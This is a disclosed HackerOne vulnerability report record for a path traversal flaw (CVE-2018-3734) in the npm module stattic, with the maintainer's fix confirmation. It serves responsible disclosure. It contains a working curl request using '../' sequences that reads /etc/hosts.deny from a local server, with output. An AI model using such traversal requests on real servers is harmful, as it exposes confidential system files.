{"id":319003,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTkwMDM=","url":"https://hackerone.com/reports/319003","title":"[stattic] Inproper path validation leads to Path Traversal and allows to read arbitrary files with any extension(s)","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-02-23T12:44:58.526Z","submitted_at":"2018-02-23T12:44:58.526Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bl4de","url":"/bl4de","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2018-3734"],"singular_disclosure_disabled":false,"disclosed_at":"2018-03-06T22:04:34.271Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2018-03-05T19:35:26.918Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report Path Traversal in ```stattic``` module.\nIt allows to read content of some arbitrary files from the server where ```stattic``` is installed and run.\n\n## Module\n\n**module name:** stattic\n**version:** 0.2.3\n**npm page:** https://www.npmjs.com/package/stattic\n\n### Module Description\n\nRidiculous simple script for serving static files using http module.\n\n### Module Stats\n\nStats\n7 downloads in the last day\n32 downloads in the last week\n77 downloads in the last month\n\n~900 estimated downloads per year\n\n## Vulnerability Description\n\nPath Traversal vulnerability in ```stattic module``` allows to go up in directory tree and read content of some files outside of the root path set up in the module config.\n\nHowever, this issue allows to read only files with extension, because if no extension is provided, ```stattic``` by default uses setting from ```options.index``` variable.\n\n## Steps To Reproduce:\n\nInstall ```stattic``` module:\n\n```\n$ npm install stattic\n```\n\nCreate sample application:\n\n```javascript\n// app.js\n//Import libs\nvar stattic = require('stattic');\n \n//Set the folder with the static files\nstattic.set('folder', './');\n \n//Set the port\nstattic.set('port', 8080);\n \n//Run the server\nstattic.listen();\n```\n\nRun application:\n\n```\n$ node app.js\n```\n\nHere's the part of ```stattic``` code responsible for handling paths:\n\n```javascript\n// node_modules/stattic/index.js, line 70:\n\n    //Parse the request url and get only the pathname\n    var pathname = url.parse(req.url).pathname;\n\n    //Resolve to the local folder\n    var local_path = path.join(options.folder, pathname);\n\n    //Check the extension\n    if(path.extname(local_path) === '')\n    {\n      //Add the index file to the local path\n      local_path = path.join(local_path, './' + path.basename(options.index));\n    }\n\n```\n\nIf file provided has no extension, ```/``` and ```options.index``` are added (by default, it will become ```/index.html```). This causes that eg. ```/etc/passwd``` path become ```/etc/passwd/index.html```, but ```/etc/hosts.deny``` is valid filename and can be read:\n\n```\n$ curl -v --path-as-is http://localhost:8080/../../../../../etc/hosts.deny\n*   Trying ::1...\n* Connected to localhost (::1) port 8080 (#0)\n\u003e GET /../../../../../etc/hosts.deny HTTP/1.1\n\u003e Host: localhost:8080\n\u003e User-Agent: curl/7.47.0\n\u003e Accept: */*\n\u003e \n\u003c HTTP/1.1 200 OK\n\u003c Content-Type: null\n\u003c Date: Fri, 23 Feb 2018 12:36:35 GMT\n\u003c Connection: keep-alive\n\u003c Transfer-Encoding: chunked\n\u003c \n# /etc/hosts.deny: list of hosts that are _not_ allowed to access the system.\n#                  See the manual pages hosts_access(5) and hosts_options(5).\n#\n# Example:    ALL: some.host.name, .some.domain\n#             ALL EXCEPT in.fingerd: other.host.name, .other.domain\n#\n# If you're going to protect the portmapper use the name \"rpcbind\" for the\n# daemon name. See rpcbind(8) and rpc.mountd(8) for further information.\n#\n# The PARANOID wildcard matches any host whose name does not match its\n# address.\n#\n# You may wish to enable this to ensure any programs that don't\n# validate looked up hostnames still leave understandable logs. In past\n# versions of Debian this has been the default.\n# ALL: PARANOID\n\n* Connection #0 to host localhost left intact\n```\n\n## Patch\n\nProbably some protection against typical Path Traversal exploitation methods should be introduced here.\n\n## Supporting Material/References:\n\n- Operating system: Ubuntu 16.04\n- Node.js 8.9.4\n- npm v. 5.6.0\n- curl 7.47.0\n\n## Wrap up\n\n- I contacted the maintainer to let him know: [N] \n- I opened an issue in the related repository: [N] \n\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nPath Traversal vulnerability in ```stattic module``` allows to go up in directory tree and read content of some files outside of the root path set up in the module config.","vulnerability_information_html":"\u003cp\u003eI would like to report Path Traversal in \u003ccode\u003estattic\u003c/code\u003e module.\u003cbr\u003e\nIt allows to read content of some arbitrary files from the server where \u003ccode\u003estattic\u003c/code\u003e is installed and run.\u003c/p\u003e\n\n\u003ch2 id=\"module\"\u003eModule\u003c/h2\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e stattic\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 0.2.3\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ca title=\"https://www.npmjs.com/package/stattic\" href=\"/redirect?url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fstattic\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.npmjs.com/package/stattic\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch3 id=\"module-description\"\u003eModule Description\u003c/h3\u003e\n\n\u003cp\u003eRidiculous simple script for serving static files using http module.\u003c/p\u003e\n\n\u003ch3 id=\"module-stats\"\u003eModule Stats\u003c/h3\u003e\n\n\u003cp\u003eStats\u003cbr\u003e\n7 downloads in the last day\u003cbr\u003e\n32 downloads in the last week\u003cbr\u003e\n77 downloads in the last month\u003c/p\u003e\n\n\u003cp\u003e~900 estimated downloads per year\u003c/p\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003ePath Traversal vulnerability in \u003ccode\u003estattic module\u003c/code\u003e allows to go up in directory tree and read content of some files outside of the root path set up in the module config.\u003c/p\u003e\n\n\u003cp\u003eHowever, this issue allows to read only files with extension, because if no extension is provided, \u003ccode\u003estattic\u003c/code\u003e by default uses setting from \u003ccode\u003eoptions.index\u003c/code\u003e variable.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eInstall \u003ccode\u003estattic\u003c/code\u003e module:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ npm install stattic\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCreate sample application:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e// app.js\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e//Import libs\u003c/span\u003e\n\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003estattic\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003estattic\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e//Set the folder with the static files\u003c/span\u003e\n\u003cspan class=\"nx\"\u003estattic\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"kd\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003efolder\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e./\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e//Set the port\u003c/span\u003e\n\u003cspan class=\"nx\"\u003estattic\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"kd\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eport\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e8080\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e//Run the server\u003c/span\u003e\n\u003cspan class=\"nx\"\u003estattic\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elisten\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eRun application:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ node app.js\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHere\u0026#39;s the part of \u003ccode\u003estattic\u003c/code\u003e code responsible for handling paths:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e// node_modules/stattic/index.js, line 70:\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e//Parse the request url and get only the pathname\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003epathname\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003epathname\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e//Resolve to the local folder\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003elocal_path\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eoptions\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003efolder\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003epathname\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e//Check the extension\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eextname\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003elocal_path\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"c1\"\u003e//Add the index file to the local path\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003elocal_path\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003elocal_path\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e./\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebasename\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eoptions\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eindex\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf file provided has no extension, \u003ccode\u003e/\u003c/code\u003e and \u003ccode\u003eoptions.index\u003c/code\u003e are added (by default, it will become \u003ccode\u003e/index.html\u003c/code\u003e). This causes that eg. \u003ccode\u003e/etc/passwd\u003c/code\u003e path become \u003ccode\u003e/etc/passwd/index.html\u003c/code\u003e, but \u003ccode\u003e/etc/hosts.deny\u003c/code\u003e is valid filename and can be read:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ curl -v --path-as-is http://localhost:8080/../../../../../etc/hosts.deny\n*   Trying ::1...\n* Connected to localhost (::1) port 8080 (#0)\n\u0026gt; GET /../../../../../etc/hosts.deny HTTP/1.1\n\u0026gt; Host: localhost:8080\n\u0026gt; User-Agent: curl/7.47.0\n\u0026gt; Accept: */*\n\u0026gt; \n\u0026lt; HTTP/1.1 200 OK\n\u0026lt; Content-Type: null\n\u0026lt; Date: Fri, 23 Feb 2018 12:36:35 GMT\n\u0026lt; Connection: keep-alive\n\u0026lt; Transfer-Encoding: chunked\n\u0026lt; \n# /etc/hosts.deny: list of hosts that are _not_ allowed to access the system.\n#                  See the manual pages hosts_access(5) and hosts_options(5).\n#\n# Example:    ALL: some.host.name, .some.domain\n#             ALL EXCEPT in.fingerd: other.host.name, .other.domain\n#\n# If you\u0026#39;re going to protect the portmapper use the name \u0026quot;rpcbind\u0026quot; for the\n# daemon name. See rpcbind(8) and rpc.mountd(8) for further information.\n#\n# The PARANOID wildcard matches any host whose name does not match its\n# address.\n#\n# You may wish to enable this to ensure any programs that don\u0026#39;t\n# validate looked up hostnames still leave understandable logs. In past\n# versions of Debian this has been the default.\n# ALL: PARANOID\n\n* Connection #0 to host localhost left intact\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\n\u003cp\u003eProbably some protection against typical Path Traversal exploitation methods should be introduced here.\u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eOperating system: Ubuntu 16.04\u003c/li\u003e\n\u003cli\u003eNode.js 8.9.4\u003c/li\u003e\n\u003cli\u003enpm v. 5.6.0\u003c/li\u003e\n\u003cli\u003ecurl 7.47.0\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"wrap-up\"\u003eWrap up\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let him know: [N] \u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: [N] \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eRegards,\u003c/p\u003e\n\n\u003cp\u003eRafal \u0026#39;bl4de\u0026#39; Janicki\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003ePath Traversal vulnerability in \u003ccode\u003estattic module\u003c/code\u003e allows to go up in directory tree and read content of some files outside of the root path set up in the module config.\u003c/p\u003e\n","weakness":{"id":19,"name":"Path Traversal"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-04-04T19:35:27.118Z","allow_singular_disclosure_after":-86349517.70124957,"singular_disclosure_allowed":true,"vote_count":7,"voters":["eveeez","whitesector","khaledibnalwalid","cr4xerbik4sh","japz","geotester","alexoooo"],"severity":{"rating":"high","score":8.6,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":6377,"asset_type":"SOURCE_CODE","asset_identifier":"stattic","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2425882,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-23T15:15:43.845Z","updated_at":"2018-02-23T15:15:43.845Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2425885,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-23T15:15:57.340Z","updated_at":"2018-02-23T15:15:57.340Z","additional_data":{"old_severity":"Low","new_severity":"High (8.6)","old_severity_id":121874,"new_severity_id":121916},"actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2425887,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-23T15:16:57.065Z","updated_at":"2018-02-23T15:16:57.065Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"old_scope":"Other module","new_scope":"stattic","genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2425891,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @bl4de,\n\nThanks for reporting this issue.\n\nI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\nI will invite the package maintainer to this issue.\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/bl4de\"\u003e@bl4de\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks for reporting this issue.\u003c/p\u003e\n\n\u003cp\u003eI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\u003cbr\u003e\nI will invite the package maintainer to this issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-23T15:17:33.082Z","updated_at":"2018-02-23T15:17:33.082Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2426691,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-23T18:38:19.595Z","updated_at":"2018-02-23T18:38:19.595Z","cve_ids":["CVE-2018-3734"],"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2452797,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I opened a generic security issue in the repo to invite the maintainers to the discussion.","markdown_message":"\u003cp\u003eI opened a generic security issue in the repo to invite the maintainers to the discussion.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-03T11:10:55.877Z","updated_at":"2018-03-03T11:10:55.877Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2457733,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-05T09:53:32.018Z","updated_at":"2018-03-05T09:53:32.018Z","actor":{"username":"jmjuanes","cleared":false,"url":"/jmjuanes","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2458364,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\nThanks for your report. This issue is now solved in `v0.3.0`.\n\n```\n$ git clone https://github.com/jmjuanes/stattic.git\n$ cd stattic/\n$ ll\ntotal 64\n-rw-r--r--  1 jmjuanes  staff  1081 Mar  5 11:01 LICENSE\n-rw-r--r--  1 jmjuanes  staff  2372 Mar  5 11:01 README.md\ndrwxr-xr-x  3 jmjuanes  staff   102 Mar  5 11:01 assets\n-rw-r--r--  1 jmjuanes  staff   731 Mar  5 12:56 cli.js\n-rw-r--r--  1 jmjuanes  staff  4279 Mar  5 12:49 index.js\ndrwxr-xr-x  5 jmjuanes  staff   170 Mar  5 12:56 node_modules\n-rw-r--r--  1 jmjuanes  staff   594 Mar  5 12:56 package-lock.json\n-rw-r--r--  1 jmjuanes  staff   513 Mar  5 12:57 package.json\n-rw-r--r--  1 jmjuanes  staff   335 Mar  5 11:01 stattic.iml\n$ node cli.js --folder ./assets\n\nStatic server listening on: http://localhost:5000\nReading files from: /Users/jmjuanes/workspace/stattic/assets\n```\nIf you try to read the `package.json` file located in the parent folder, it throws a 404 http status:\n```\n$ curl -v --path-as-is http://localhost:5000/../package.json\n*   Trying ::1...\n* Connected to localhost (::1) port 5000 (#0)\n\u003e GET /../package.json HTTP/1.1\n\u003e Host: localhost:5000\n\u003e User-Agent: curl/7.43.0\n\u003e Accept: */*\n\u003e\n\u003c HTTP/1.1 404 OK\n\u003c Content-Type: text/html\n\u003c Date: Mon, 05 Mar 2018 14:28:53 GMT\n\u003c Connection: keep-alive\n\u003c Transfer-Encoding: chunked\n\u003c\n\u003c!-- External resources --\u003e\n\u003clink href=\"https://fonts.googleapis.com/css?family=Montserrat\" rel=\"stylesheet\"\u003e\n\n\u003c!-- Styles --\u003e\n\u003cstyle\u003e\n  body\n  {\n    font-family: 'Montserrat', sans-serif;\n    margin: 0px;\n    margin-top: 200px;\n    padding: 0px;\n    font-size: 14px;\n    color: #697496;\n  }\n  .error-header\n  {\n    display:block;\n    font-size: 17px;\n    font-weight: bold;\n    color: #57607c;\n    margin-bottom: 8px;\n  }\n  .error-detail\n  {\n    display: block;\n  }\n\u003c/style\u003e\n\n\u003c!-- Error header --\u003e\n\u003cdiv class=\"error-header\" align=\"center\"\u003eError 404\u003c/div\u003e\n\n\u003c!-- Error detail information --\u003e\n\u003cdiv class=\"error-detail\" align=\"center\"\u003eFile not found on the server. Try again or contact with the administrator.\u003c/div\u003e\n* Connection #0 to host localhost left intact\n```\n\nFurther comments or issues, please open a new issue in the repository. \n\nRegards,\nJose.","markdown_message":"\u003cp\u003eHi,\u003cbr\u003e\nThanks for your report. This issue is now solved in \u003ccode\u003ev0.3.0\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ git clone https://github.com/jmjuanes/stattic.git\n$ cd stattic/\n$ ll\ntotal 64\n-rw-r--r--  1 jmjuanes  staff  1081 Mar  5 11:01 LICENSE\n-rw-r--r--  1 jmjuanes  staff  2372 Mar  5 11:01 README.md\ndrwxr-xr-x  3 jmjuanes  staff   102 Mar  5 11:01 assets\n-rw-r--r--  1 jmjuanes  staff   731 Mar  5 12:56 cli.js\n-rw-r--r--  1 jmjuanes  staff  4279 Mar  5 12:49 index.js\ndrwxr-xr-x  5 jmjuanes  staff   170 Mar  5 12:56 node_modules\n-rw-r--r--  1 jmjuanes  staff   594 Mar  5 12:56 package-lock.json\n-rw-r--r--  1 jmjuanes  staff   513 Mar  5 12:57 package.json\n-rw-r--r--  1 jmjuanes  staff   335 Mar  5 11:01 stattic.iml\n$ node cli.js --folder ./assets\n\nStatic server listening on: http://localhost:5000\nReading files from: /Users/jmjuanes/workspace/stattic/assets\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf you try to read the \u003ccode\u003epackage.json\u003c/code\u003e file located in the parent folder, it throws a 404 http status:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ curl -v --path-as-is http://localhost:5000/../package.json\n*   Trying ::1...\n* Connected to localhost (::1) port 5000 (#0)\n\u0026gt; GET /../package.json HTTP/1.1\n\u0026gt; Host: localhost:5000\n\u0026gt; User-Agent: curl/7.43.0\n\u0026gt; Accept: */*\n\u0026gt;\n\u0026lt; HTTP/1.1 404 OK\n\u0026lt; Content-Type: text/html\n\u0026lt; Date: Mon, 05 Mar 2018 14:28:53 GMT\n\u0026lt; Connection: keep-alive\n\u0026lt; Transfer-Encoding: chunked\n\u0026lt;\n\u0026lt;!-- External resources --\u0026gt;\n\u0026lt;link href=\u0026quot;https://fonts.googleapis.com/css?family=Montserrat\u0026quot; rel=\u0026quot;stylesheet\u0026quot;\u0026gt;\n\n\u0026lt;!-- Styles --\u0026gt;\n\u0026lt;style\u0026gt;\n  body\n  {\n    font-family: \u0026#39;Montserrat\u0026#39;, sans-serif;\n    margin: 0px;\n    margin-top: 200px;\n    padding: 0px;\n    font-size: 14px;\n    color: #697496;\n  }\n  .error-header\n  {\n    display:block;\n    font-size: 17px;\n    font-weight: bold;\n    color: #57607c;\n    margin-bottom: 8px;\n  }\n  .error-detail\n  {\n    display: block;\n  }\n\u0026lt;/style\u0026gt;\n\n\u0026lt;!-- Error header --\u0026gt;\n\u0026lt;div class=\u0026quot;error-header\u0026quot; align=\u0026quot;center\u0026quot;\u0026gt;Error 404\u0026lt;/div\u0026gt;\n\n\u0026lt;!-- Error detail information --\u0026gt;\n\u0026lt;div class=\u0026quot;error-detail\u0026quot; align=\u0026quot;center\u0026quot;\u0026gt;File not found on the server. Try again or contact with the 